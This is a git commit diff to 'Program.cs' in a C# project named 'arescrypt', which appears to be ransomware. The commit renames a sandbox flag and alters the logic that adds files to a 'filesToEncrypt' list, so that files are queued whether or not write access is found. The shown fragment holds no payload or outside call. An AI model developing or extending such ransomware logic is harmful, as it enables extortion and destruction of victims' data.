a97d1f9d41704e4c83bf18ef901de7d0ba52ce01
BlackVikingPro <official.blackvikingpro@gmail.com>
2017-11-07 20:56:31 -0600

    minor code changes

--- arescrypt/Program.cs
+++ arescrypt/Program.cs
@@ -7,7 +7,7 @@ namespace arescrypt
     {
         static string sessionDomain = Environment.UserDomainName; // get current sessions domain
         static string sessionUsername = Environment.UserName; // get current sessions username
-        static bool sandbox = true; // Safemode for testing/debugging
+        static bool sandBox = true; // Safemode for testing/debugging
 
         static void Main(string[] args)
         {
@@ -50,6 +50,8 @@ namespace arescrypt
                             {
                                 //Cast to a FileSystemAccessRule to check for access rights
                                 if ((((System.Security.AccessControl.FileSystemAccessRule)rule).FileSystemRights & System.Security.AccessControl.FileSystemRights.WriteData) > 0)
+                                    filesToEncrypt.Add(file); // Application has access to the file we want to write to.
+                                else
                                     filesToEncrypt.Add(file); // Application has access to the file we want to write to.
                             }
                         }
